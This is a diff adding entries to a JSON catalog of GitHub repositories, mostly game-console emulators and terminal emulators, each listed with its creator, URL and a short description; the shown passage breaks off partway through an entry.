@@ -12828,5 +12828,3195 @@
     "url": "https://github.com/Seidler93/Madden-Franchise-Server",
     "cover": "https://avatars.githubusercontent.com/u/66758675?v=4",
     "description": "Madden Franchise Server 🎮 A remote-accessible Madden franchise server for RPCS3 & PCSX2. Friends can play anytime via a custom Electron launcher with locked emulator settings, shared saves, and remote access (Parsec/Sunshine). Features auto-restart, watchdog scripts, and an easy setup for low-tech users. 🚀"
+  },
+  {
+    "name": "alacritty",
+    "slug": "alacritty",
+    "creator": "alacritty",
+    "version": "...",
+    "console": "Multi Platform",
+    "url": "https://github.com/alacritty/alacritty",
+    "cover": "https://avatars.githubusercontent.com/u/29714349?v=4",
+    "description": "A cross-platform, OpenGL terminal emulator."
+  },
+  {
+    "name": "termux-app",
+    "slug": "termux-app",
+    "creator": "termux",
+    "version": "...",
+    "console": "Multi Platform",
+    "url": "https://github.com/termux/termux-app",
+    "cover": "https://avatars.githubusercontent.com/u/8104776?v=4",
+    "description": "Termux - a terminal emulator application for Android OS extendible by variety of packages."
+  },
+  {
+    "name": "ghostty",
+    "slug": "ghostty",
+    "creator": "ghostty-org",
+    "version": "...",
+    "console": "Multi Platform",
+    "url": "https://github.com/ghostty-org/ghostty",
+    "cover": "https://avatars.githubusercontent.com/u/169223740?v=4",
+    "description": "👻 Ghostty is a fast, feature-rich, and cross-platform terminal emulator that uses platform-native UI and GPU acceleration."
+  },
+  {
+    "name": "edex-ui",
+    "slug": "edex-ui",
+    "creator": "GitSquared",
+    "version": "...",
+    "console": "Multi Platform",
+    "url": "https://github.com/GitSquared/edex-ui",
+    "cover": "https://avatars.githubusercontent.com/u/24496417?v=4",
+    "description": "A cross-platform, customizable science fiction terminal emulator with advanced monitoring & touchscreen support."
+  },
+  {
+    "name": "shadPS4",
+    "slug": "shadps4",
+    "creator": "shadps4-emu",
+    "version": "...",
+    "console": "Multi Platform",
+    "url": "https://github.com/shadps4-emu/shadPS4",
+    "cover": "https://avatars.githubusercontent.com/u/152868421?v=4",
+    "description": "PlayStation 4 emulator for Windows, Linux and macOS written in C++"
+  },
+  {
+    "name": "wezterm",
+    "slug": "wezterm",
+    "creator": "wezterm",
+    "version": "...",
+    "console": "Multi Platform",
+    "url": "https://github.com/wezterm/wezterm",
+    "cover": "https://avatars.githubusercontent.com/u/198158019?v=4",
+    "description": "A GPU-accelerated cross-platform terminal emulator and multiplexer written by @wez and implemented in Rust"
+  },
+  {
+    "name": "ish",
+    "slug": "ish",
+    "creator": "ish-app",
+    "version": "...",
+    "console": "Multi Platform",
+    "url": "https://github.com/ish-app/ish",
+    "cover": "https://avatars.githubusercontent.com/u/38895825?v=4",
+    "description": "Linux shell for iOS"
+  },
+  {
+    "name": "upterm",
+    "slug": "upterm",
+    "creator": "railsware",
+    "version": "...",
+    "console": "Multi Platform",
+    "url": "https://github.com/railsware/upterm",
+    "cover": "https://avatars.githubusercontent.com/u/9354?v=4",
+    "description": "A terminal emulator for the 21st century."
+  },
+  {
+    "name": "ruffle",
+    "slug": "ruffle",
+    "creator": "ruffle-rs",
+    "version": "...",
+    "console": "Multi Platform",
+    "url": "https://github.com/ruffle-rs/ruffle",
+    "cover": "https://avatars.githubusercontent.com/u/50037962?v=4",
+    "description": "A Flash Player emulator written in Rust"
+  },
+  {
+    "name": "docker-android",
+    "slug": "docker-android",
+    "creator": "budtmo",
+    "version": "...",
+    "console": "Android",
+    "url": "https://github.com/budtmo/docker-android",
+    "cover": "https://avatars.githubusercontent.com/u/22218312?v=4",
+    "description": "Android in docker solution with noVNC supported and video recording"
+  },
+  {
+    "name": "duckstation",
+    "slug": "duckstation",
+    "creator": "stenzek",
+    "version": "...",
+    "console": "Multi Platform",
+    "url": "https://github.com/stenzek/duckstation",
+    "cover": "https://avatars.githubusercontent.com/u/11288319?v=4",
+    "description": "Fast PlayStation 1 emulator for x86-64/AArch32/AArch64/RV64"
+  },
+  {
+    "name": "FluentTerminal",
+    "slug": "fluentterminal",
+    "creator": "felixse",
+    "version": "...",
+    "console": "Multi Platform",
+    "url": "https://github.com/felixse/FluentTerminal",
+    "cover": "https://avatars.githubusercontent.com/u/30559812?v=4",
+    "description": "A Terminal Emulator based on UWP and web technologies."
+  },
+  {
+    "name": "Cemu",
+    "slug": "cemu",
+    "creator": "cemu-project",
+    "version": "...",
+    "console": "Multi Platform",
+    "url": "https://github.com/cemu-project/Cemu",
+    "cover": "https://avatars.githubusercontent.com/u/40145098?v=4",
+    "description": "Cemu - Wii U emulator"
+  },
+  {
+    "name": "unicorn",
+    "slug": "unicorn",
+    "creator": "unicorn-engine",
+    "version": "...",
+    "console": "Multi Platform",
+    "url": "https://github.com/unicorn-engine/unicorn",
+    "cover": "https://avatars.githubusercontent.com/u/13391512?v=4",
+    "description": "Unicorn CPU emulator framework (ARM, AArch64, M68K, Mips, Sparc, PowerPC, RiscV, S390x, TriCore, X86)"
+  },
+  {
+    "name": "vlmcsd",
+    "slug": "vlmcsd",
+    "creator": "Wind4",
+    "version": "...",
+    "console": "Multi Platform",
+    "url": "https://github.com/Wind4/vlmcsd",
+    "cover": "https://avatars.githubusercontent.com/u/3997851?v=4",
+    "description": "KMS Emulator in C (currently runs on Linux including Android, FreeBSD, Solaris, Minix, Mac OS, iOS, Windows with or without Cygwin)"
+  },
+  {
+    "name": "Android-Debug-Database",
+    "slug": "android-debug-database",
+    "creator": "amitshekhariitbhu",
+    "version": "...",
+    "console": "Android",
+    "url": "https://github.com/amitshekhariitbhu/Android-Debug-Database",
+    "cover": "https://avatars.githubusercontent.com/u/9877145?v=4",
+    "description": "A library for debugging android databases and shared preferences - Make Debugging Great Again"
+  },
+  {
+    "name": "macintosh.js",
+    "slug": "macintosh-js",
+    "creator": "felixrieseberg",
+    "version": "...",
+    "console": "Multi Platform",
+    "url": "https://github.com/felixrieseberg/macintosh.js",
+    "cover": "https://avatars.githubusercontent.com/u/1426799?v=4",
+    "description": "🖥 A virtual Apple Macintosh with System 8, running in Electron. I'm sorry."
+  },
+  {
+    "name": "azerothcore-wotlk",
+    "slug": "azerothcore-wotlk",
+    "creator": "azerothcore",
+    "version": "...",
+    "console": "Multi Platform",
+    "url": "https://github.com/azerothcore/azerothcore-wotlk",
+    "cover": "https://avatars.githubusercontent.com/u/20147732?v=4",
+    "description": "Complete Open Source and Modular solution for MMO"
+  },
+  {
+    "name": "blink",
+    "slug": "blink",
+    "creator": "jart",
+    "version": "...",
+    "console": "Multi Platform",
+    "url": "https://github.com/jart/blink",
+    "cover": "https://avatars.githubusercontent.com/u/49262?v=4",
+    "description": "tiniest x86-64-linux emulator"
+  },
+  {
+    "name": "FEX",
+    "slug": "fex",
+    "creator": "FEX-Emu",
+    "version": "...",
+    "console": "Multi Platform",
+    "url": "https://github.com/FEX-Emu/FEX",
+    "cover": "https://avatars.githubusercontent.com/u/61863475?v=4",
+    "description": "A fast usermode x86 and x86-64 emulator for Arm64 Linux"
+  },
+  {
+    "name": "azahar",
+    "slug": "azahar",
+    "creator": "azahar-emu",
+    "version": "...",
+    "console": "Multi Platform",
+    "url": "https://github.com/azahar-emu/azahar",
+    "cover": "https://avatars.githubusercontent.com/u/188636407?v=4",
+    "description": "An open-source 3DS emulator project based on Citra."
+  },
+  {
+    "name": "rio",
+    "slug": "rio",
+    "creator": "raphamorim",
+    "version": "...",
+    "console": "Multi Platform",
+    "url": "https://github.com/raphamorim/rio",
+    "cover": "https://avatars.githubusercontent.com/u/3630346?v=4",
+    "description": "A hardware-accelerated GPU terminal emulator focusing to run in desktops and browsers."
+  },
+  {
+    "name": "BlackDex",
+    "slug": "blackdex",
+    "creator": "CodingGay",
+    "version": "...",
+    "console": "Multi Platform",
+    "url": "https://github.com/CodingGay/BlackDex",
+    "cover": "https://avatars.githubusercontent.com/u/83878298?v=4",
+    "description": "BlackDex is an Android unpack(dexdump) tool, it supports Android 5.0~12 and need not rely to any environment. BlackDex can run on any Android mobile phone or emulator, you can unpack APK File in several seconds."
+  },
+  {
+    "name": "Delta",
+    "slug": "delta",
+    "creator": "rileytestut",
+    "version": "...",
+    "console": "Multi Platform",
+    "url": "https://github.com/rileytestut/Delta",
+    "cover": "https://avatars.githubusercontent.com/u/705880?v=4",
+    "description": "Delta is an all-in-one classic video game emulator for non-jailbroken iOS devices."
+  },
+  {
+    "name": "qiling",
+    "slug": "qiling",
+    "creator": "qilingframework",
+    "version": "...",
+    "console": "Multi Platform",
+    "url": "https://github.com/qilingframework/qiling",
+    "cover": "https://avatars.githubusercontent.com/u/46340064?v=4",
+    "description": "A True Instrumentable Binary Emulation Framework"
+  },
+  {
+    "name": "nes",
+    "slug": "nes",
+    "creator": "fogleman",
+    "version": "...",
+    "console": "Nintendo Entertainment System",
+    "url": "https://github.com/fogleman/nes",
+    "cover": "https://avatars.githubusercontent.com/u/520208?v=4",
+    "description": "NES emulator written in Go."
+  },
+  {
+    "name": "tilix",
+    "slug": "tilix",
+    "creator": "gnunn1",
+    "version": "...",
+    "console": "Multi Platform",
+    "url": "https://github.com/gnunn1/tilix",
+    "cover": "https://avatars.githubusercontent.com/u/9358238?v=4",
+    "description": "A tiling terminal emulator for Linux using GTK+ 3"
+  },
+  {
+    "name": "box64",
+    "slug": "box64",
+    "creator": "ptitSeb",
+    "version": "...",
+    "console": "Multi Platform",
+    "url": "https://github.com/ptitSeb/box64",
+    "cover": "https://avatars.githubusercontent.com/u/3250792?v=4",
+    "description": "Box64 - Linux Userspace x86_64 Emulator with a twist, targeted at ARM64, RV64 and LoongArch Linux devices"
+  },
+  {
+    "name": "serverless-offline",
+    "slug": "serverless-offline",
+    "creator": "dherault",
+    "version": "...",
+    "console": "Multi Platform",
+    "url": "https://github.com/dherault/serverless-offline",
+    "cover": "https://avatars.githubusercontent.com/u/4154003?v=4",
+    "description": "Emulate AWS λ and API Gateway locally when developing your Serverless project"
+  },
+  {
+    "name": "PyBoy",
+    "slug": "pyboy",
+    "creator": "Baekalfen",
+    "version": "...",
+    "console": "Multi Platform",
+    "url": "https://github.com/Baekalfen/PyBoy",
+    "cover": "https://avatars.githubusercontent.com/u/5528170?v=4",
+    "description": "Game Boy emulator written in Python"
+  },
+  {
+    "name": "Vita3K",
+    "slug": "vita3k",
+    "creator": "Vita3K",
+    "version": "...",
+    "console": "Multi Platform",
+    "url": "https://github.com/Vita3K/Vita3K",
+    "cover": "https://avatars.githubusercontent.com/u/34121543?v=4",
+    "description": "Experimental PlayStation Vita emulator"
+  },
+  {
+    "name": "SimpleNES",
+    "slug": "simplenes",
+    "creator": "amhndu",
+    "version": "...",
+    "console": "Nintendo Entertainment System",
+    "url": "https://github.com/amhndu/SimpleNES",
+    "cover": "https://avatars.githubusercontent.com/u/2724742?v=4",
+    "description": "An NES emulator in C++"
+  },
+  {
+    "name": "gameboy.live",
+    "slug": "gameboy-live",
+    "creator": "HFO4",
+    "version": "...",
+    "console": "Game Boy",
+    "url": "https://github.com/HFO4/gameboy.live",
+    "cover": "https://avatars.githubusercontent.com/u/16058869?v=4",
+    "description": "🕹️ A basic gameboy emulator with terminal \"Cloud Gaming\" support"
+  },
+  {
+    "name": "unidbg",
+    "slug": "unidbg",
+    "creator": "zhkl0228",
+    "version": "...",
+    "console": "Multi Platform",
+    "url": "https://github.com/zhkl0228/unidbg",
+    "cover": "https://avatars.githubusercontent.com/u/1386751?v=4",
+    "description": "Allows you to emulate an Android native library, and an experimental  iOS emulation"
+  },
+  {
+    "name": "linuxpdf",
+    "slug": "linuxpdf",
+    "creator": "ading2210",
+    "version": "...",
+    "console": "Linux",
+    "url": "https://github.com/ading2210/linuxpdf",
+    "cover": "https://avatars.githubusercontent.com/u/71154407?v=4",
+    "description": "Linux running inside a PDF file via a RISC-V emulator"
+  },
+  {
+    "name": "melonDS",
+    "slug": "melonds",
+    "creator": "melonDS-emu",
+    "version": "...",
+    "console": "Nintendo DS",
+    "url": "https://github.com/melonDS-emu/melonDS",
+    "cover": "https://avatars.githubusercontent.com/u/94202166?v=4",
+    "description": "DS emulator, sorta"
+  },
+  {
+    "name": "awesome-gbdev",
+    "slug": "awesome-gbdev",
+    "creator": "gbdev",
+    "version": "...",
+    "console": "Multi Platform",
+    "url": "https://github.com/gbdev/awesome-gbdev",
+    "cover": "https://avatars.githubusercontent.com/u/29732935?v=4",
+    "description": "A curated list of Game Boy development resources such as tools, docs, emulators, related projects and open-source ROMs."
+  },
+  {
+    "name": "magspoof",
+    "slug": "magspoof",
+    "creator": "samyk",
+    "version": "...",
+    "console": "Multi Platform",
+    "url": "https://github.com/samyk/magspoof",
+    "cover": "https://avatars.githubusercontent.com/u/411832?v=4",
+    "description": "A portable device that can spoof/emulate any magnetic stripe, credit card or hotel card \"wirelessly\", even on standard magstripe (non-NFC/RFID) readers. It can disable Chip&PIN and predict AMEX card numbers with 100% accuracy."
+  },
+  {
+    "name": "Triton",
+    "slug": "triton",
+    "creator": "JonathanSalwan",
+    "version": "...",
+    "console": "Multi Platform",
+    "url": "https://github.com/JonathanSalwan/Triton",
+    "cover": "https://avatars.githubusercontent.com/u/991046?v=4",
+    "description": "Triton is a dynamic binary analysis library. Build your own program analysis tools, automate your reverse engineering, perform software verification or just emulate code."
+  },
+  {
+    "name": "86Box",
+    "slug": "86box",
+    "creator": "86Box",
+    "version": "...",
+    "console": "Multi Platform",
+    "url": "https://github.com/86Box/86Box",
+    "cover": "https://avatars.githubusercontent.com/u/35927955?v=4",
+    "description": "Emulator of x86-based machines."
+  },
+  {
+    "name": "ViGEmBus",
+    "slug": "vigembus",
+    "creator": "nefarius",
+    "version": "...",
+    "console": "Multi Platform",
+    "url": "https://github.com/nefarius/ViGEmBus",
+    "cover": "https://avatars.githubusercontent.com/u/286631?v=4",
+    "description": "Windows kernel-mode driver emulating well-known USB game controllers."
+  },
+  {
+    "name": "citra",
+    "slug": "citra",
+    "creator": "PabloMK7",
+    "version": "...",
+    "console": "Multi Platform",
+    "url": "https://github.com/PabloMK7/citra",
+    "cover": "https://avatars.githubusercontent.com/u/10946643?v=4",
+    "description": "A Nintendo 3DS Emulator"
+  },
+  {
+    "name": "mobile-mcp",
+    "slug": "mobile-mcp",
+    "creator": "mobile-next",
+    "version": "...",
+    "console": "Multi Platform",
+    "url": "https://github.com/mobile-next/mobile-mcp",
+    "cover": "https://avatars.githubusercontent.com/u/205340688?v=4",
+    "description": "Model Context Protocol Server for Mobile Automation and Scraping (iOS, Android, Emulators, Simulators and Real Devices)"
+  },
+  {
+    "name": "visualboyadvance-m",
+    "slug": "visualboyadvance-m",
+    "creator": "visualboyadvance-m",
+    "version": "...",
+    "console": "Multi Platform",
+    "url": "https://github.com/visualboyadvance-m/visualboyadvance-m",
+    "cover": "https://avatars.githubusercontent.com/u/12837344?v=4",
+    "description": "The continuing development of the legendary VBA gameboy advance emulator."
+  },
+  {
+    "name": "xemu",
+    "slug": "xemu",
+    "creator": "xemu-project",
+    "version": "...",
+    "console": "Multi Platform",
+    "url": "https://github.com/xemu-project/xemu",
+    "cover": "https://avatars.githubusercontent.com/u/61253676?v=4",
+    "description": "Original Xbox Emulator for Windows, macOS, and Linux (Active Development)"
+  },
+  {
+    "name": "box86",
+    "slug": "box86",
+    "creator": "ptitSeb",
+    "version": "...",
+    "console": "Multi Platform",
+    "url": "https://github.com/ptitSeb/box86",
+    "cover": "https://avatars.githubusercontent.com/u/3250792?v=4",
+    "description": "Box86 - Linux Userspace x86 Emulator with a twist, targeted at ARM Linux devices"
+  },
+  {
+    "name": "Lemuroid",
+    "slug": "lemuroid",
+    "creator": "Swordfish90",
+    "version": "...",
+    "console": "Multi Platform",
+    "url": "https://github.com/Swordfish90/Lemuroid",
+    "cover": "https://avatars.githubusercontent.com/u/6009070?v=4",
+    "description": "All in one emulator on Android!"
+  },
+  {
+    "name": "docker-android",
+    "slug": "docker-android",
+    "creator": "HQarroum",
+    "version": "...",
+    "console": "Android",
+    "url": "https://github.com/HQarroum/docker-android",
+    "cover": "https://avatars.githubusercontent.com/u/1384633?v=4",
+    "description": "🤖 A minimal and customizable Docker image running the Android emulator as a service."
+  },
+  {
+    "name": "orbital",
+    "slug": "orbital",
+    "creator": "AlexAltea",
+    "version": "...",
+    "console": "Multi Platform",
+    "url": "https://github.com/AlexAltea/orbital",
+    "cover": "https://avatars.githubusercontent.com/u/5306886?v=4",
+    "description": "Experimental PlayStation 4 emulator."
+  },
+  {
+    "name": "touchHLE",
+    "slug": "touchhle",
+    "creator": "touchHLE",
+    "version": "...",
+    "console": "Multi Platform",
+    "url": "https://github.com/touchHLE/touchHLE",
+    "cover": "https://avatars.githubusercontent.com/u/128069185?v=4",
+    "description": "High-level emulator for iPhone OS apps. This repo is used for issues, releases and CI. Submit patches at: https://review.gerrithub.io/admin/repos/touchHLE/touchHLE"
+  },
+  {
+    "name": "furnace",
+    "slug": "furnace",
+    "creator": "tildearrow",
+    "version": "...",
+    "console": "Multi Platform",
+    "url": "https://github.com/tildearrow/furnace",
+    "cover": "https://avatars.githubusercontent.com/u/13842506?v=4",
+    "description": "a multi-system chiptune tracker compatible with DefleMask modules"
+  },
+  {
+    "name": "desmume",
+    "slug": "desmume",
+    "creator": "TASEmulators",
+    "version": "...",
+    "console": "Multi Platform",
+    "url": "https://github.com/TASEmulators/desmume",
+    "cover": "https://avatars.githubusercontent.com/u/11743303?v=4",
+    "description": "DeSmuME is a Nintendo DS emulator"
+  },
+  {
+    "name": "termora",
+    "slug": "termora",
+    "creator": "TermoraDev",
+    "version": "...",
+    "console": "Multi Platform",
+    "url": "https://github.com/TermoraDev/termora",
+    "cover": "https://avatars.githubusercontent.com/u/191319894?v=4",
+    "description": "Termora is a terminal emulator and SSH client for Windows, macOS and Linux."
+  },
+  {
+    "name": "EmuDeck",
+    "slug": "emudeck",
+    "creator": "dragoonDorise",
+    "version": "...",
+    "console": "Multi Platform",
+    "url": "https://github.com/dragoonDorise/EmuDeck",
+    "cover": "https://avatars.githubusercontent.com/u/6368050?v=4",
+    "description": "Emulator configurator for Steam Deck"
+  },
+  {
+    "name": "limbo",
+    "slug": "limbo",
+    "creator": "limboemu",
+    "version": "...",
+    "console": "Multi Platform",
+    "url": "https://github.com/limboemu/limbo",
+    "cover": "https://avatars.githubusercontent.com/u/17214991?v=4",
+    "description": "Limbo is a QEMU-based emulator for Android. It currently supports x86, ARM, PowerPC, and Sparc emulation  for Intel x86 and ARM android devices. See wiki https://virtualmachinery.weebly.com for APK download and Instructions."
+  },
+  {
+    "name": "EmulatorJS",
+    "slug": "emulatorjs",
+    "creator": "EmulatorJS",
+    "version": "...",
+    "console": "Multi Platform",
+    "url": "https://github.com/EmulatorJS/EmulatorJS",
+    "cover": "https://avatars.githubusercontent.com/u/113546769?v=4",
+    "description": "A web-based frontend for RetroArch"
+  },
+  {
+    "name": "wsl-terminal",
+    "slug": "wsl-terminal",
+    "creator": "mskyaxl",
+    "version": "...",
+    "console": "Multi Platform",
+    "url": "https://github.com/mskyaxl/wsl-terminal",
+    "cover": "https://avatars.githubusercontent.com/u/5708771?v=4",
+    "description": "Terminal emulator for Windows Subsystem for Linux (WSL)"
+  },
+  {
+    "name": "darktile",
+    "slug": "darktile",
+    "creator": "liamg",
+    "version": "...",
+    "console": "Multi Platform",
+    "url": "https://github.com/liamg/darktile",
+    "cover": "https://avatars.githubusercontent.com/u/1187060?v=4",
+    "description": ":waning_crescent_moon: Darktile is an experimental/abandoned GPU rendered terminal emulator designed for tiling window managers. "
+  },
+  {
+    "name": "contour",
+    "slug": "contour",
+    "creator": "contour-terminal",
+    "version": "...",
+    "console": "Multi Platform",
+    "url": "https://github.com/contour-terminal/contour",
+    "cover": "https://avatars.githubusercontent.com/u/86773043?v=4",
+    "description": "Modern C++ Terminal Emulator"
+  },
+  {
+    "name": "openauto",
+    "slug": "openauto",
+    "creator": "f1xpl",
+    "version": "...",
+    "console": "Multi Platform",
+    "url": "https://github.com/f1xpl/openauto",
+    "cover": "https://avatars.githubusercontent.com/u/20688442?v=4",
+    "description": "AndroidAuto headunit emulator"
+  },
+  {
+    "name": "sogen",
+    "slug": "sogen",
+    "creator": "momo5502",
+    "version": "...",
+    "console": "Multi Platform",
+    "url": "https://github.com/momo5502/sogen",
+    "cover": "https://avatars.githubusercontent.com/u/4027748?v=4",
+    "description": "🪅 Windows User Space Emulator "
+  },
+  {
+    "name": "extraterm",
+    "slug": "extraterm",
+    "creator": "sedwards2009",
+    "version": "...",
+    "console": "Multi Platform",
+    "url": "https://github.com/sedwards2009/extraterm",
+    "cover": "https://avatars.githubusercontent.com/u/6926644?v=4",
+    "description": "The swiss army chainsaw of terminal emulators"
+  },
+  {
+    "name": "goboy",
+    "slug": "goboy",
+    "creator": "Humpheh",
+    "version": "...",
+    "console": "Multi Platform",
+    "url": "https://github.com/Humpheh/goboy",
+    "cover": "https://avatars.githubusercontent.com/u/1696213?v=4",
+    "description": "Multi-platform Nintendo Game Boy Color emulator written in Go"
+  },
+  {
+    "name": "awesome-terminals",
+    "slug": "awesome-terminals",
+    "creator": "cdleon",
+    "version": "...",
+    "console": "Multi Platform",
+    "url": "https://github.com/cdleon/awesome-terminals",
+    "cover": "https://avatars.githubusercontent.com/u/4023005?v=4",
+    "description": "Terminal Emulators"
+  },
+  {
+    "name": "BizHawk",
+    "slug": "bizhawk",
+    "creator": "TASEmulators",
+    "version": "...",
+    "console": "Multi Platform",
+    "url": "https://github.com/TASEmulators/BizHawk",
+    "cover": "https://avatars.githubusercontent.com/u/11743303?v=4",
+    "description": "BizHawk is a multi-system emulator written in C#.  BizHawk provides nice features for casual gamers such as full screen, and joypad support in addition to full rerecording and debugging tools for all system cores.  "
+  },
+  {
+    "name": "Kyty",
+    "slug": "kyty",
+    "creator": "InoriRus",
+    "version": "...",
+    "console": "Multi Platform",
+    "url": "https://github.com/InoriRus/Kyty",
+    "cover": "https://avatars.githubusercontent.com/u/7149418?v=4",
+    "description": "PS4 & PS5 emulator"
+  },
+  {
+    "name": "paparazzi",
+    "slug": "paparazzi",
+    "creator": "cashapp",
+    "version": "...",
+    "console": "Multi Platform",
+    "url": "https://github.com/cashapp/paparazzi",
+    "cover": "https://avatars.githubusercontent.com/u/49219790?v=4",
+    "description": "Render your Android screens without a physical device or emulator"
+  },
+  {
+    "name": "Switch-Emulators-Guide",
+    "slug": "switch-emulators-guide",
+    "creator": "Abd-007",
+    "version": "...",
+    "console": "Nintendo Switch",
+    "url": "https://github.com/Abd-007/Switch-Emulators-Guide",
+    "cover": "https://avatars.githubusercontent.com/u/84527034?v=4",
+    "description": "A guide to get either Yuzu or Ryujinx running on your PC. Includes links for games, keys, firmware, shaders and some other stuff. Made for 128BitBay."
+  },
+  {
+    "name": "J2ME-Loader",
+    "slug": "j2me-loader",
+    "creator": "nikita36078",
+    "version": "...",
+    "console": "Multi Platform",
+    "url": "https://github.com/nikita36078/J2ME-Loader",
+    "cover": "https://avatars.githubusercontent.com/u/3035571?v=4",
+    "description": "A J2ME emulator for Android."
+  },
+  {
+    "name": "selfie",
+    "slug": "selfie",
+    "creator": "cksystemsteaching",
+    "version": "...",
+    "console": "Multi Platform",
+    "url": "https://github.com/cksystemsteaching/selfie",
+    "cover": "https://avatars.githubusercontent.com/u/3297229?v=4",
+    "description": "An educational software system of a tiny self-compiling C compiler, a tiny self-executing RISC-V emulator, and a tiny self-hosting RISC-V hypervisor."
+  },
+  {
+    "name": "neural-amp-modeler",
+    "slug": "neural-amp-modeler",
+    "creator": "sdatkinson",
+    "version": "...",
+    "console": "Multi Platform",
+    "url": "https://github.com/sdatkinson/neural-amp-modeler",
+    "cover": "https://avatars.githubusercontent.com/u/12240186?v=4",
+    "description": "Neural network emulator for guitar amplifiers."
+  },
+  {
+    "name": "MiniSim",
+    "slug": "minisim",
+    "creator": "okwasniewski",
+    "version": "...",
+    "console": "Multi Platform",
+    "url": "https://github.com/okwasniewski/MiniSim",
+    "cover": "https://avatars.githubusercontent.com/u/52801365?v=4",
+    "description": "MacOS menu bar app for launching iOS  and Android 🤖 emulators"
+  },
+  {
+    "name": "Cxbx-Reloaded",
+    "slug": "cxbx-reloaded",
+    "creator": "Cxbx-Reloaded",
+    "version": "...",
+    "console": "Multi Platform",
+    "url": "https://github.com/Cxbx-Reloaded/Cxbx-Reloaded",
+    "cover": "https://avatars.githubusercontent.com/u/24608560?v=4",
+    "description": "Xbox (Original) Emulator"
+  },
+  {
+    "name": "strato",
+    "slug": "strato",
+    "creator": "strato-emu",
+    "version": "...",
+    "console": "Multi Platform",
+    "url": "https://github.com/strato-emu/strato",
+    "cover": "https://avatars.githubusercontent.com/u/133053931?v=4",
+    "description": "Run Nintendo Switch homebrew & games on your Android device!"
+  },
+  {
+    "name": "ESP8266Audio",
+    "slug": "esp8266audio",
+    "creator": "earlephilhower",
+    "version": "...",
+    "console": "Multi Platform",
+    "url": "https://github.com/earlephilhower/ESP8266Audio",
+    "cover": "https://avatars.githubusercontent.com/u/11875?v=4",
+    "description": "Arduino library to play MOD, WAV, FLAC, MIDI, RTTTL, OGG/Opus, MP3, and AAC files on I2S DACs or with a software emulated delta-sigma DAC on the ESP8266 and ESP32 and Pico"
+  },
+  {
+    "name": "EasyProtector",
+    "slug": "easyprotector",
+    "creator": "lamster2018",
+    "version": "...",
+    "console": "Multi Platform",
+    "url": "https://github.com/lamster2018/EasyProtector",
+    "cover": "https://avatars.githubusercontent.com/u/8605787?v=4",
+    "description": "一行代码检测XP/调试/多开/模拟器/root"
+  },
+  {
+    "name": "Mesen2",
+    "slug": "mesen2",
+    "creator": "SourMesen",
+    "version": "...",
+    "console": "Multi Platform",
+    "url": "https://github.com/SourMesen/Mesen2",
+    "cover": "https://avatars.githubusercontent.com/u/21093973?v=4",
+    "description": "Multi-system emulator (NES, SNES, GB, GBA, PCE, SMS/GG, WS) for Windows, Linux and macOS"
+  },
+  {
+    "name": "snowflake",
+    "slug": "snowflake",
+    "creator": "subhra74",
+    "version": "...",
+    "console": "Multi Platform",
+    "url": "https://github.com/subhra74/snowflake",
+    "cover": "https://avatars.githubusercontent.com/u/8403090?v=4",
+    "description": "Graphical SFTP client and terminal emulator with helpful utilities"
+  },
+  {
+    "name": "flycast",
+    "slug": "flycast",
+    "creator": "flyinghead",
+    "version": "...",
+    "console": "Multi Platform",
+    "url": "https://github.com/flyinghead/flycast",
+    "cover": "https://avatars.githubusercontent.com/u/16261910?v=4",
+    "description": "Flycast is a multiplatform Sega Dreamcast, Naomi, Naomi 2 and Atomiswave emulator"
+  },
+  {
+    "name": "qemu-t8030",
+    "slug": "qemu-t8030",
+    "creator": "TrungNguyen1909",
+    "version": "...",
+    "console": "Multi Platform",
+    "url": "https://github.com/TrungNguyen1909/qemu-t8030",
+    "cover": "https://avatars.githubusercontent.com/u/22745058?v=4",
+    "description": "iPhone 11 emulated on QEMU"
+  },
+  {
+    "name": "Battery-Emulator",
+    "slug": "battery-emulator",
+    "creator": "dalathegreat",
+    "version": "...",
+    "console": "Multi Platform",
+    "url": "https://github.com/dalathegreat/Battery-Emulator",
+    "cover": "https://avatars.githubusercontent.com/u/26695010?v=4",
+    "description": "This revolutionary software enables EV battery packs to be easily reused for stationary storage in combination with solar inverters"
+  },
+  {
+    "name": "py-kms",
+    "slug": "py-kms",
+    "creator": "SystemRage",
+    "version": "...",
+    "console": "Multi Platform",
+    "url": "https://github.com/SystemRage/py-kms",
+    "cover": "https://avatars.githubusercontent.com/u/25354386?v=4",
+    "description": "KMS Server Emulator written in Python"
+  },
+  {
+    "name": "Steam-Deck-Guide",
+    "slug": "steam-deck-guide",
+    "creator": "mikeroyal",
+    "version": "...",
+    "console": "Multi Platform",
+    "url": "https://github.com/mikeroyal/Steam-Deck-Guide",
+    "cover": "https://avatars.githubusercontent.com/u/45159366?v=4",
+    "description": "Steam Deck Guide. Learn all about the Tools, Accessories, Games, Emulators, and Gaming Tips that will make your Steam Deck an awesome Gaming Handheld or a Portable Computer Workstation. "
+  },
+  {
+    "name": "qemu-rpi-kernel",
+    "slug": "qemu-rpi-kernel",
+    "creator": "dhruvvyas90",
+    "version": "...",
+    "console": "Multi Platform",
+    "url": "https://github.com/dhruvvyas90/qemu-rpi-kernel",
+    "cover": "https://avatars.githubusercontent.com/u/1730398?v=4",
+    "description": "Qemu kernel for emulating Rpi on QEMU"
+  },
+  {
+    "name": "fpPS4",
+    "slug": "fpps4",
+    "creator": "red-prig",
+    "version": "...",
+    "console": "Multi Platform",
+    "url": "https://github.com/red-prig/fpPS4",
+    "cover": "https://avatars.githubusercontent.com/u/68122101?v=4",
+    "description": "PS4 compatibility layer (emulator) on Free Pascal"
+  },
+  {
+    "name": "arkos",
+    "slug": "arkos",
+    "creator": "christianhaitian",
+    "version": "...",
+    "console": "Multi Platform",
+    "url": "https://github.com/christianhaitian/arkos",
+    "cover": "https://avatars.githubusercontent.com/u/22970448?v=4",
+    "description": "Another rockchip Operating System"
+  },
+  {
+    "name": "mini-rv32ima",
+    "slug": "mini-rv32ima",
+    "creator": "cnlohr",
+    "version": "...",
+    "console": "Multi Platform",
+    "url": "https://github.com/cnlohr/mini-rv32ima",
+    "cover": "https://avatars.githubusercontent.com/u/2748168?v=4",
+    "description": "A tiny C header-only risc-v emulator."
+  },
+  {
+    "name": "Vectras-VM-Android",
+    "slug": "vectras-vm-android",
+    "creator": "xoureldeen",
+    "version": "...",
+    "console": "Android",
+    "url": "https://github.com/xoureldeen/Vectras-VM-Android",
+    "cover": "https://avatars.githubusercontent.com/u/79816069?v=4",
+    "description": "It's a Virtual Machine App for Android Which is Based on QEMU"
+  },
+  {
+    "name": "SameBoy",
+    "slug": "sameboy",
+    "creator": "LIJI32",
+    "version": "...",
+    "console": "Multi Platform",
+    "url": "https://github.com/LIJI32/SameBoy",
